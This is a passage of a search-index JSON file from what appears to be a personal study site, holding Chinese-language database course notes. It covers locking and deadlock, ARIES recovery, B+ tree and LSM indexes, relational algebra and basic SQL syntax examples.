<li>\u9501\u8f6c\u6362(Lock Conversions)\uff1a\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06 S \u9501\u5347\u7ea7\u4e3a X \u9501\uff0cX \u9501\u964d\u7ea7\u4e3a S \u9501\u7684\u673a\u5236\u3002\u53ea\u80fd\u5728\u589e \u957f\u9636\u6bb5\u5347\u7ea7\uff0c\u7f29\u51cf\u9636\u6bb5\u964d\u7ea7\u3002</li> <li>DeadLock<ul> <li>\u4e92\u76f8\u6301\u6709\u9501\u7684\u65f6\u5019\u89e6\u53d1\u6b7b\u9501</li> <li>\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4e8b\u52a1\u524d\u5c31\u8981\u6c42\u62ff\u5230\u9501\u4ee5\u907f\u514d\u8fd0\u884c\u65f6\u6b7b\u9501\uff08\u5f53\u7136\u8fd9\u6837\u505a\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u6027\u80fd\u4ee3\u4ef7\uff09</li> <li>\u901a\u8fc7\u753b\u4f9d\u8d56\u56fe\u5224\u65ad\u662f\u5426\u4ea7\u751f\u6b7b\u9501</li> <li>\u6b7b\u9501\u6062\u590d\uff1a\u9009\u53d6\u4e00\u4e9b\u4e8b\u52a1\u8fdb\u884c\u56de\u6eda\u3002\u5f53\u91cd\u590d\u9009\u53d6\u540c\u6837\u7684\u4e8b\u52a1\u727a\u7272(victim)\u5e76\u4e0d\u65ad\u9677\u5165\u6b7b\u9501\u65f6\uff0c\u5373\u9677\u5165starvation(\u9965\u997f)</li> </ul> </li> </ul>"},{"location":"course/db/transaction/#recovery-system","title":"Recovery System","text":""},{"location":"course/db/transaction/#log-based-recovery","title":"log-based Recovery \u57fa\u4e8e\u65e5\u5fd7\u7684\u6062\u590d","text":"<ul> <li>\u65e5\u5fd7(log)\u88ab\u5b58\u50a8\u5728\u7a33\u5b9a\u7684\u5b58\u50a8\u4e2d\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u7684\u65e5\u5fd7\u8bb0\u5f55<ul> <li>\u4e8b\u52a1\u5f00\u59cb<code>&lt;T start&gt;</code></li> <li>\u5199\u64cd\u4f5c\u4e4b\u524d\u4e4b\u524d\u7684\u65e5\u5fd7\u8bb0\u5f55<code>&lt;Ti, x, V1, V2&gt;</code><ul> <li>(X)\u662f\u5199\u7684\u4f4d\u7f6e\uff0c</li> <li>V1\uff0cV2\u5206\u522b\u662f\u5199\u4e4b\u524d\u548c\u4e4b\u540e\u7684X\u5904\u7684\u503c</li> </ul> </li> <li>\u4e8b\u52a1\u7ed3\u675f\u7684\u65f6\u5019\u5199\u5165<code>&lt;T commit&gt;</code></li> </ul> </li> <li>\u5bf9\u4e8e\u66f4\u65b0\u4e8b\u52a1\u7684\u4e24\u6761\u89c4\u5219<ul> <li>commit rule\uff1a\u65b0\u7684\u6570\u636e\u5728commit\u4e4b\u524d\u5fc5\u987b\u88ab\u5199\u5728\u975e\u6613\u5931\u6027\u7684\u5b58\u50a8\u5668\u4e2d</li> <li>logging rule\uff1a\u65e7\u7684\u503c\u5728\u65b0\u7684\u5199\u5165\u4e4b\u524d\u9700\u8981\u88ab\u5199\u5728\u65e5\u5fd7\u91cc</li> </ul> </li> </ul>"},{"location":"course/db/transaction/#aries","title":"Aries\u7b97\u6cd5","text":"<ul> <li> <p>Log</p> <ul> <li>\u8bb0\u5f55\u4e00\u4e9b\u5fc5\u8981\u4fe1\u606f</li> </ul> </li> <li> <p>Page LSN</p> <ul> <li>\u6bcf\u4e00\u9875\u7684LSN</li> <li>\u662f\u6bcf\u4e00\u9875\u4e2d\u6700\u540e\u4e00\u6761\u8d77\u4f5c\u7528\u7684\u65e5\u5fd7\u8bb0\u5f55\u7684LSN\u7f16\u53f7</li> </ul> </li> <li> <p>Log Buffer</p> <ul> <li>\u8bb0\u5f55\u7684\u7f13\u51b2\u533a\uff0c\u8fd8\u6ca1\u6709\u5199\u5165Stable log</li> </ul> </li> <li> <p>Dirty Page Table</p> <ul> <li>\u5b58\u50a8\u5728\u7f13\u51b2\u533a\u7684\uff0c\u8bb0\u5f55\u5df2\u7ecf\u88ab\u66f4\u65b0\u8fc7\u7684page\u7684\u8868</li> <li>\u6bcf\u4e2a\u9875\u7684RecLSN\uff0c\u8868\u793a\u8fd9\u4e00\u9875\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e2d\uff0c\u5728RecLSN\u4e4b\u524d\u7684Log\u5df2\u7ecf\u90fd\u88ab\u5199\u5165Stable log</li> </ul> </li> <li> <p>Checkpoint</p> <ul> <li>\u8bb0\u5f55\u810f\u9875\u8868\u4fe1\u606f\u548c\u6d3b\u8dc3\u4e8b\u52a1\u7684LastLSN</li> <li>\u548clog-based Recovery\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4e0d\u4f1a\u628a\u5185\u5b58\u9875\u5199\u5165\u78c1\u76d8</li> </ul> </li> <li> <p>\u6062\u590d\u64cd\u4f5c</p> <ul> <li>\u5206\u6790\u9636\u6bb5<ul> <li>\u8bfb\u53d6\u6700\u540e\u4e00\u6761\u5b8c\u6574\u7684checkpoint\u65e5\u5fd7\u8bb0\u5f55\u4fe1\u606f<ul> <li>\u8bbe\u7f6eRedoLSN = min RecLSN(\u810f\u9875\u8868\u4e2d\u7684)\uff0c\u5982\u679c\u810f\u9875\u8868\u662f\u7a7a\u7684\u5c31\u8bbe\u7f6e\u4e3acheckpoint\u7684LSN(\u51b3\u5b9a\u4ece\u54ea\u91cc\u5f00\u59cbredo)</li> <li>\u8bbe\u7f6eundo-list\uff1acheckpoint\u4e2d\u8bb0\u5f55\u7684\u4e8b\u52a1</li> <li>\u8bfb\u53d6undo-list\u4e2d\u6bcf\u4e00\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u7684LSN</li> </ul> </li> <li>\u4ececheckpoint\u5f00\u59cb\u6b63\u5411\u626b\u63cf<ul> <li>\u5982\u679c\u53d1\u73b0\u4e86\u4e0d\u5728undo-list\u4e2d\u7684\u8bb0\u5f55\u5c31\u5199\u5165undo-list</li> <li>\u5f53\u53d1\u73b0\u4e00\u6761\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\uff0c\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\uff0c\u7528\u8be5\u8bb0\u5f55\u7684LSN\u4f5c\u4e3a RecLSN\u5199\u5165\u810f\u9875\u8868\u4e2d</li> <li>\u5982\u679c\u53d1\u73b0\u4e86\u6807\u5fd7\u4e8b\u52a1\u7ed3\u675f\u7684\u65e5\u5fd7\u8bb0\u5f55(commit, abort) \u5c31\u4eceundo-list\u4e2d\u79fb\u9664\u8fd9\u4e2a\u4e8b\u52a1</li> </ul> </li> </ul> </li> <li>Redo\u9636\u6bb5<ul> <li>\u4eceRedoLSN\u5f00\u59cb\u6b63\u5411\u626b\u63cf\uff0c\u5f53\u53d1\u73b0\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\u3002\u6216\u8005\u8fd9\u4e00\u6761\u8bb0\u5f55\u7684LSN\u5c0f\u4e8e\u9875\u9762\u7684RecLSN\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761</li> <li>\u5426\u5219\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u8fd9\u4e00\u9875\uff0c\u5982\u679c\u78c1\u76d8\u4e2d\u5f97\u5230\u7684\u8fd9\u4e00\u9875\u7684PageLSN\u6bd4\u8fd9\u4e00\u6761\u8981\u5c0f\uff0c\u5c31redo\uff0c\u5426\u5219\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761\u8bb0\u5f55</li> </ul> </li> <li>Undo\u9636\u6bb5<ul> <li>\u4ece\u65e5\u5fd7\u672b\u5c3e\u5148\u524d\u5411\u524d\u641c\u7d22\uff0cundo\u6240\u6709undo-list\u4e2d\u6709\u7684\u4e8b\u52a1</li> <li>\u7528\u5206\u6790\u9636\u6bb5\u7684\u6700\u540e\u4e00\u4e2aLSN\u6765\u627e\u5230\u6bcf\u4e2a\u65e5\u5fd7\u6700\u540e\u7684\u8bb0\u5f55</li> <li>\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u6700\u5927\u7684LSN\u5bf9\u5e94\u7684\u4e8b\u52a1undo</li> <li>\u5728undo\u4e00\u6761\u8bb0\u5f55\u4e4b\u540e<ul> <li>\u5bf9\u4e8e\u666e\u901a\u7684\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aPrevLSN</li> <li>\u5bf9\u4e8eCLR\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aUndoNextLSN</li> </ul> </li> <li>\u5982\u4f55undo\uff1a\u5f53\u4e00\u6761\u8bb0\u5f55undo\u7684\u65f6\u5019<ul> <li>\u751f\u6210\u4e00\u4e2a\u5305\u542b\u6267\u884c\u64cd\u4f5c\u7684CLR</li> <li>\u8bbe\u7f6eCLR\u7684UndoNextLSN\u4e3a\u66f4\u65b0\u8bb0\u5f55\u7684LSN</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p></p>"},{"location":"course/db/index/","title":"Database Index","text":""},{"location":"course/db/index/#_1","title":"\u6982\u8ff0","text":"<p>\u6570\u636e\u5e93\u7d22\u5f15\u662f\u4e3a\u4e86\u4fbf\u4e8e\u5728\u5404\u6837\u7684\u64cd\u4f5c\u4e2d\u5b9a\u4f4d\u6240\u9700\u7684\u6570\u636e\u9879\u3002\u6839\u636e\u7d22\u5f15\u65b9\u5f0f\u53ef\u5206\u4e3a\u987a\u5e8f\u7d22\u5f15\u3001\u6563\u5217\u7d22\u5f15\u7b49\u3002</p>"},{"location":"course/db/index/#ordered-indices","title":"\u987a\u5e8f\u7d22\u5f15(ordered indices)","text":"<p>\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5bf9\u6570\u636e\u8fdb\u884c\u987a\u5e8f\u7684\u7d22\u5f15\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a </p> <p>\u4e0a\u9762\u8fd9\u6837\u7684\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\uff0c\u53c8\u88ab\u79f0\u4e3a\u7a20\u5bc6\u7d22\u5f15(Cluster Index)\u3002 \u5982\u679c\u6070\u597d\u6570\u636e\u672c\u8eab\u5c31\u662f\u4f9d\u7167\u8fd9\u4e2a\u7d22\u5f15\u987a\u5e8f\u6392\u5217\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7d22\u5f15\u4e5f\u88ab\u79f0\u4e3a\u4e3b\u7d22\u5f15(\u805a\u96c6\u7d22\u5f15)(Primary Index)\uff1b\u53cd\u4e4b\uff0c\u5219\u4e3a\u8f85\u52a9\u7d22\u5f15(\u975e\u805a\u96c6\u7d22\u5f15)(Secondary Index)\uff0c\u6bd4\u5982\u4e0b\u56fe\uff1a  \u5bf9\u4e8e\u4e3b\u7d22\u5f15\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u7a00\u758f\u7d22\u5f15(Dense Index)\u7684\u65b9\u5f0f\u8282\u7701\u7d22\u5f15\u7a7a\u95f4\uff1a  \u4f46\u6709\u65f6\uff0c\u76f4\u63a5\u7a20\u5bc6\u7d22\u5f15\u4e0d\u80fd\u88ab\u76f4\u63a5\u653e\u5728Memory\u4e2d\uff08\u56e0\u4e3a\u592a\u5927\u4e86\uff09\uff0c\u6240\u4ee5\u9700\u8981\u91c7\u7528\u591a\u7ea7\u7d22\u5f15*(Multilevel Index)\u7684\u65b9\u5f0f\u3002\u5206\u4e3aouter index\u548cinner index\u3002</p>"},{"location":"course/db/index/#b","title":"B+\u6811\u7d22\u5f15","text":"<p>\u5b9e\u9645\u4e0aB+\u6811\u7d22\u5f15\u4e5f\u5c5e\u4e8e\u987a\u5e8f\u7d22\u5f15\u3002\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5229\u7528B+\u6811\u5efa\u7acb\u7d22\u5f15\uff0cB+\u6811\u7684\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003B+ Tree\u3002 \u5728\u5b9e\u9645\u7684\u5de5\u4e1a\u5e94\u7528\u4e2d\uff0cB+ Tree\u5f80\u5f80\u4f1a\u548cLSM Tree\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u51cf\u5c11\u5728Disk\u4e2d\u53cd\u590d\u64cd\u4f5c\u7684overhead\uff08\u5199\u4f18\u5316\uff09\u3002</p>"},{"location":"course/db/index/#_2","title":"\u6563\u5217\u7d22\u5f15","text":"<p>\u4f7f\u7528Hash\u8868\u8fdb\u884c\u7d22\u5f15\u3002</p>"},{"location":"course/db/index/Bplus/","title":"B+ Tree","text":""},{"location":"course/db/index/Bplus/#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u975e\u9875\u8282\u70b9\u6709\\(\\lceil n/2\\rceil \\sim n\\)\u4e2a\u5b50\u8282\u70b9\uff0c\u53f6\u8282\u70b9\u6709\\(\\lceil(n-1)/2\\rceil \\sim n-1\\)\u4e2a\u503c\u3002</li> <li>\u652f\u6301\u64cd\u4f5c\uff1a\u589e\u5220\u67e5\u6539\uff08\u5177\u4f53\u89c1ADS\u4e2dB+\u6811\u7684\u5404\u79cd\u64cd\u4f5c\uff09\uff0c\u590d\u6742\u5ea6\u4e3a\\(\\log{N}\\)</li> </ul>"},{"location":"course/db/index/Bplus/#bottom-up-b-tree-build","title":"Bottom up B+ tree Build","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u82e5\u8981\u5c06\u5176\u6784\u5efa\u6210B+\u6811\uff0c\u9700\u8981\u7ecf\u8fc7\u4ee5\u4e0b\u6d41\u7a0b</p> <ul> <li>\u5bf9\u5e8f\u5217\u8fdb\u884c\u6392\u5e8f</li> <li>\u5bf9\u5e8f\u5217\u8fdb\u884c\u5212\u5206\uff08\u6839\u636eB+\u6811\u7684\u652f\u6301\u5757\u5927\u5c0f\u8fdb\u884c\u5212\u5206\uff09\u6bd4\u5982\u5bf9\u4e8e\u652f\u6301n=5\u7684B+\u6811\uff0c\u6392\u5e8f\u957f\u5ea6\u4e3a13\u7684\u5e8f\u5217\uff0c\u5219\u5212\u5206\u4e3a4+4+3+2(\u6700\u540e\u4e24\u5757\u4e0d\u80fd\u662f4+1\uff0c\u56e0\u4e3a\\(1&lt;\\lceil (4-1)/2\\rceil\\))</li> <li>\u6784\u5efa\u5b8c\u6700\u5e95\u5c42\u4e4b\u540e\uff0c\u518d\u4ece\u4e0b\u81f3\u4e0a\u6784\u5efa</li> <li>\u5199\u5165\u78c1\u76d8\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u5199\u5165\uff09</li> </ul>"},{"location":"course/db/index/Bplus/#b","title":"\u5408\u5e76B+\u6811","text":"<p>\u5982\u679c\u8981\u5408\u5e76\u4e24\u4e2aB+\u6811\uff0c\u6d41\u7a0b\u5982\u4e0b</p> <ul> <li>\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u8bfb\u51fa\uff0c\u56e0\u4e3a\u53f6\u5b50\u8282\u70b9\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff09</li> <li>\u5408\u5e76\u6709\u5e8f\u5e8f\u5217</li> <li>\u91cd\u590dBottom up B+ tree build\u7684\u64cd\u4f5c</li> </ul>"},{"location":"course/db/index/lsm/","title":"LSM Tree","text":""},{"location":"course/db/index/lsm/#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u4e00\u79cd\u5199\u4f18\u5316\u7684\u5b58\u50a8\u7ed3\u6784</li> <li>\u91c7\u53d6\u5206\u5c42\u5b58\u50a8\u7684\u7ed3\u6784</li> <li>\u76f8\u6bd4\u4e8eB+\u6811\uff0c\u5b83\u5728\u603b\u80fd\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\u5199</li> </ul>"},{"location":"course/db/index/lsm/#_2","title":"\u5177\u4f53\u7b56\u7565","text":"<ul> <li>Memory\u7684\\(L_0\\)\u5c42\u6ee1\u4e4b\u540e\uff0c\u76f4\u63a5\u5199\u5165Disk\u4e2d\u7684\\(L_0^1\\)\u5c42\uff08\u53ea\u9700\u8981\u4e00\u6b21\u7684seek\u5373\u53ef\uff09\uff1b</li> <li>\u5f53Disk\u7684\\(L_0\\)\u5c42\u6ee1\u65f6\uff0c\u9700\u8981\u5408\u5e76(Compaction)\\(L_0\\)\u5c42\u6240\u6709\u7684\u6811\uff0c\u7136\u540e\u518d\u5199\u5165\\(L_1\\)\u5c42\uff1b</li> <li>\u5f53\u6d89\u53ca\u66f4\u65b0/\u5220\u9664\u64cd\u4f5c\u65f6\uff0c\u540c\u6837\u5316\u4e3a\u63d2\u5165\u64cd\u4f5c\u6267\u884c\u63d2\u5165\u3002\u5e76\u5728Compaction\u65f6\u6b63\u5f0f\u6267\u884c\u3002</li> </ul>"},{"location":"course/db/sql/","title":"Relational Model","text":""},{"location":"course/db/sql/#_1","title":"\u57fa\u672c\u7ed3\u6784","text":"<ul> <li>\u4e00\u5f20\u8868\u5bf9\u5e94\u4e00\u4e2a\u5173\u7cfb(relation)\uff0c\u884c\u5bf9\u5e94\u5143\u7ec4(tuple)\uff0c\u5217\u5bf9\u5e94\u5c5e\u6027(attribute)</li> <li>\u7801 key<ul> <li>Let \\(K \\subseteq R\\)</li> <li>\\(K\\) is a superkey of \\(R\\) is values for \\(K\\) are sufficient to identify a unique tuple of each possible relation</li> <li>\\(K\\) is a condidate key is \\(K\\) is minial superkey</li> <li>\\(K\\) is a primary key, if K is a candidate key and is defined by user explicitly</li> <li>Foreign key Assume there exists relations \\(r\\) and \\(s\\): \\(r(A,B,C)\\), \\(s(B,D)\\), we can say that attribute \\(B\\) in relation \\(r\\) is foreign key referencing \\(s\\), and \\(r\\) is a referencing relation, and \\(s\\) is a referenced relation.</li> </ul> </li> </ul>"},{"location":"course/db/sql/#_2","title":"\u5173\u7cfb\u4ee3\u6570","text":"<p>\u5173\u7cfb\u4ee3\u6570\u662fRelational Model\u7684\u6570\u5b66\u57fa\u7840\uff0c\u8be6\u89c1Relational algebra</p>"},{"location":"course/db/sql/#sql","title":"SQL","text":"<p>SQL\uff1a\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\uff0c\u5206\u4e3aDDL,DML,DCL\u51e0\u79cd\u7c7b\u578b\uff0c\u8be6\u89c1SQL</p>"},{"location":"course/db/sql/algebra/","title":"Relational Algebra","text":""},{"location":"course/db/sql/algebra/#_1","title":"\u57fa\u672c\u64cd\u4f5c","text":"\u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u9009\u62e9 \\(\\sigma_p(r)\\) \u8fd4\u56de\u5173\u7cfb\\(r\\)\u4e2d\u6ee1\u8db3\u5173\u7cfb\u5f0f\\(p\\)\u7684\u5143\u7ec4\u7684\u5173\u7cfb \u6295\u5f71 \\(\\Pi_{A_1,A_2,\\dots,A_k(r)}\\) \u8fd4\u56de\u5173\u7cfb\\(r\\)\u4e2d\u5c5e\u6027\u4e3a\\(A_1,A_2,\\dots,A_k\\)\u7684\u5217\u5e76\u53bb\u91cd \u96c6\u5408\u5e76 \\(r\\cup s\\) \u5c06\u4e24\u4e2a\u5c5e\u6027\u6570\u76f8\u7b49\u4e14\u6240\u6709\u5c5e\u6027\u7684\u57df\u76f8\u540c\u7684\u4e24\u4e2a\u5173\u7cfb\u5408\u5e76\u4e3a\u540c\u4e00\u4e2a\u5173\u7cfb\uff0c\u5e76\u53bb\u91cd \u96c6\u5408\u5dee \\(r-s\\) \u8fd4\u56de\u5c5e\u4e8e\u5173\u7cfb\\(r\\)\u5374\u4e0d\u51fa\u73b0\u5728\u5173\u7cfb\\(s\\)\u4e2d\u7684\u5143\u7ec4\u7684\u5173\u7cfb \u7b1b\u5361\u5c14\u79ef \\(r\\times s\\) \u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u5173\u7cfb\u7684\u5143\u7ec4\u7ec4\u5408\uff08\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u5e94\u4e0d\u76f8\u4ea4\uff0c\u5426\u5219\u5e94\u91cd\u547d\u540d\uff09 \u91cd\u547d\u540d \\(\\rho_{x}(E)\\) \u5c06\\(E\\)\u91cd\u547d\u540d\u4e3a\\(x\\)\u5e76\u8fd4\u56de"},{"location":"course/db/sql/algebra/#_2","title":"\u62d3\u5c55\u64cd\u4f5c","text":"\u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u96c6\u5408\u4ea4 \\(r\\cap s\\) \u53d6\u540c\u65f6\u51fa\u73b0\u5728\u4e24\u4e2a\u5173\u7cfb\u4e2d\u7684\u5143\u7ec4\uff0c\u53ef\u8f6c\u5316\u4e3a\\(r-(r-s)\\) \u81ea\u7136\u8fde\u63a5 \\(r\\bowtie s\\) \u53d6\u4e24\u4e2a\u5173\u7cfb\u516c\u5171\u5c5e\u6027\u4e2d\u5177\u6709\u76f8\u540c\u5c5e\u6027\u503c\u7684\u5143\u7ec4\u8fdb\u884c\u62fc\u63a5 theta\u8fde\u63a5 \\(r\\bowtie_\\theta s\\) \u8fd4\u56de\u6ee1\u8db3\u5173\u7cfb\u5f0f\\(\\theta\\)\u7684\u81ea\u7136\u8fde\u63a5\u7ed3\u679c \u9664 \\(r\\div s\\) \\(r\\div s =\\{t \\vert t\\in\\Pi_{R-S}(r)\\cap \\forall u \\in s(tu\\in r)\\}\\) \u805a\u96c6 \\(_{G_1,G_2,\\dots, G_n}\\ \\mathcal{G}_{F_1(A_1),F_2(A_2),\\dots,F_n(A_n)}(r)\\) \\(G_i\\)\u662f\u7528\u4e8e\u5206\u7ec4\u7684\u5c5e\u6027\uff0c\\(F_i\\)\u662f\u805a\u96c6\u51fd\u6570\uff0c\\(A_i\\)\u662f\u5c5e\u6027\u540d \u8d4b\u503c \\(r\\leftarrow s\\) \u5c06\u53f3\u8fb9\u7684\u8ba1\u7b97\u7ed3\u679c\u8d4b\u503c\u7ed9\u5de6\u8fb9\u7684\u8868"},{"location":"course/db/sql/sql/","title":"SQL","text":"<p>Note</p> <p>\u5b66\u4e60\u63d0\u793a\uff1aSQL\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff0c\u8bb2\u7a76\u719f\u80fd\u751f\u5de7\uff0c\u6d89\u53ca\u7684\u8bed\u6cd5\u5f88\u591a\uff0c\u4f46\u4e0d\u9700\u8981\u5168\u90e8\u638c\u63e1\uff0c\u80fd\u89e3\u51b3\u5b9e\u9645\u9700\u6c42\u5c31\u884c\u3002</p>"},{"location":"course/db/sql/sql/#data-definition-language","title":"Data-Definition Language","text":"<p>\u63d0\u4f9b\u5b9a\u4e49\u5173\u7cfb\u6a21\u5f0f\u3001\u5220\u9664\u5173\u7cfb\u4ee5\u53ca\u4fee\u6539\u5173\u7cfb\u6a21\u5f0f\u7684\u547d\u4ee4</p> <pre><code>create table table_name1( \n    ID char(5), \n    name varchar(5) not null,  # \u7ea6\u675f\u975e\u7a7a\uff0c\u4e5f\u6709\u50cfunique\u8fd9\u6837\u7684\u9650\u5236\n    dept_name varchar(20), \n    salary numeric(8, 2), \n    primary key (ID),  # \u8bbe\u7f6e\u4e3b\u7801\n    foreign key(dept_name) references table_name2,  # \u8bbe\u7f6e\u5916\u7801\n    check (salary &gt;= 0)  # check(P) \u786e\u4fdd\u8868\u8fbe\u5f0f P \u5728\u8be5\u5173\u7cfb\u4e2d\u7684\u5b58\u5728 \n)\n</code></pre> <pre><code>drop table table_names; # \u5220\u9664\u8868\u53ca\u5185\u5bb9\ndelete table table_names; # \u4ec5\u5220\u9664\u8868\u7684\u5185\u5bb9\nalter table table_names add extra_attribute int; # \u6dfb\u52a0\u5c5e\u6027\nalter table table_names drop extra_attribute; # \u5220\u9664\u5c5e\u6027\n</code></pre>"},{"location":"course/db/sql/sql/#data-manipulation-languagedml","title":"Data-Manipulation Language(DML)","text":""},{"location":"course/db/sql/sql/#_1","title":"\u67e5\u8be2","text":"<p>\u63d0\u4f9b\u67e5\u8be2\u4fe1\u606f\uff0c\u5728\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u5143\u7ec4\u3001\u5220\u9664\u5143\u7ec4\u3001\u4fee\u6539\u5143\u7ec4\u7684\u80fd\u529b\u3002 \u67e5\u8be2\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\u4e3a\uff1a\\(from\\to where\\to group(aggregate)\\to having \\to select \\to order by\\) \u67e5\u8be2\u51fd\u6570\u7684\u8303\u5f0f\uff1a</p> \\[ \\begin{aligned} &amp;{\\rm SELECT\\ &lt;[DISTINCT]}\\ c_1, c_2, ...&gt;\\\\ &amp;{\\rm FROM}\\ &lt;r_1, ...&gt;\\\\ &amp;{\\rm [WHERE\\ &lt;}condition&gt;]\\\\ &amp;{\\rm [GROUP\\ BY }&lt;c_1,c_2,...&gt;[{\\rm HAVING}\\ &lt;cond_2&gt;]]\\\\ &amp;{\\rm [ORDER\\ BY\\ &lt;c_1\\ [DESC][,c_2[DESC|ASC],...]&gt;]} \\end{aligned} \\]"},{"location":"course/db/sql/sql/#group","title":"group\u64cd\u4f5c","text":"<ul> <li>having\u76f8\u5f53\u4e8ewhere\u7684\u4f5c\u7528</li> <li>\u805a\u5408\u51fd\u6570 avg/min/max/sum/count</li> </ul> <pre><code>select cno\nfrom detail natural join pos\nwhere year(detail.cdate)=2018\ngroup by cno\nhaving count(distinct campus)=1;\n</code></pre> <p>Warning</p> <p>\u9700\u4fdd\u8bc1\u4efb\u4f55\u6ca1\u6709\u51fa\u73b0\u5728 group by \u5b50\u53e5\u4e2d\u7684\u5c5e\u6027\uff0c\u5982\u679c\u51fa\u73b0\u5728 select/having \u8bed\u53e5\u4e2d\uff0c\u5219\u5fc5\u987b\u5728\u805a\u96c6\u51fd\u6570\u4e2d\u3002</p>"},{"location":"course/db/sql/sql/#_2","title":"\u96c6\u5408\u8fd0\u7b97","text":"<ul> <li>except/union/intersect  \u5dee\u96c6/\u5e76\u96c6/\u4ea4\u96c6</li> </ul> <pre><code>select title from movie except\nselect title from movie\nwhere exists ( \n    select *\n    from comment A, comment B\n    where A.title=movie.title and A.user_name = B.user_name and B.title=\u2019 the avenger\u2019 and A.grade &lt;=B.grade )\n</code></pre>"},{"location":"course/db/sql/sql/#_3","title":"\u5d4c\u5957\u5b50\u67e5\u8be2","text":"<ul> <li>in/not in: \u662f\u5426\u5728\u5b50\u67e5\u8be2\u4e2d</li> <li>exists: \u5b50\u67e5\u8be2\u662f\u5426\u4e3a\u7a7a</li> <li>all/some\uff1a \u6bd4\u8f83\u5927\u5c0f</li> </ul>"},{"location":"course/db/sql/sql/#_4","title":"\u63d2\u5165/\u5220\u9664/\u4fee\u6539","text":"<pre><code># \u63d2\u5165\ninsert into table_name values();\n# \u5220\u9664\ndelete from table_name where P;\n# \u4fee\u6539\nupdate r\nset attribute = ...\nwhere P\n# \u4fee\u6539(case)\nupdate r\nset attributes = case\n    when ... then ...\n    when ... then ...\n    ...\n    else result\nend\n</code></pre>"},{"location":"course/db/sql/sql/#with","title":"with\u5b50\u53e5","text":"<pre><code>with max_budget(value) as\n    (select max(budget)\n     from department)\nselect budget\nfrom department, max_budget\nwhere department.budget = max_budget.value\n</code></pre>"},{"location":"course/db/sql/sql/#_5","title":"\u521b\u5efa\u7d22\u5f15/\u89c6\u56fe","text":"<pre><code># \u521b\u5efa\u7d22\u5f15\ncreate index student_ID on student(ID);\n# \u521b\u5efa\u89c6\u56fe\ncreate view as &lt;query expression&gt;;\n</code></pre>"},{"location":"course/db/sql/sql/#_6","title":"\u4e8b\u52a1","text":"<p>\u4e8b\u52a1\u7531\u67e5\u8be2\u548c\u66f4\u65b0\u8bed\u53e5\u7684\u5e8f\u5217\u7ec4\u6210</p>"},{"location":"course/db/sql/sql/#_7","title":"\u6388\u6743","text":"<pre><code>grant/revoke &lt;\u6743\u9650\u5217\u8868&gt; # \u5305\u62ecselect, insert, update, delete\non &lt;\u5173\u7cfb\u540d\u6216\u89c6\u56fe\u540d&gt;\nto &lt;\u7528\u6237/\u89d2\u8272\u5217\u8868&gt;;\n</code></pre>"},{"location":"course/db/sql/sql/#_8","title":"\u6570\u636e\u7c7b\u578b","text":"<ul> <li>\u5927\u5bf9\u8c61\u7c7b\u578b<ul> <li>clob: \u5b57\u7b26\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b <code>book_review clob (10KB)</code></li> <li>blob: \u4e8c\u8fdb\u5236\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b <code>image blob (10MB)</code></li> </ul> </li> <li>\u7528\u6237\u5b9a\u4e49\u65b0\u7c7b\u578b<ul> <li><code>create type person_name as varchar(20)</code></li> </ul> </li> <li>\u57df<ul> <li><code>create domain dollars as numberic(12,2) not null</code></li> <li>\u53ef\u4ee5\u52a0\u5165\u7ea6\u675f\u6027\u6761\u4ef6</li> </ul> </li> </ul>"},{"location":"misc/","title":"Introduction","text":"<p>\u5728\u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f\u3002</p>"},{"location":"misc/ann/","title":"Artificial Neural Network","text":"<p>Info</p> <p>\u4e3b\u8981\u6458\u81ea\u300aAscend AI Processor Architecture and Programming: Principles and Applications of 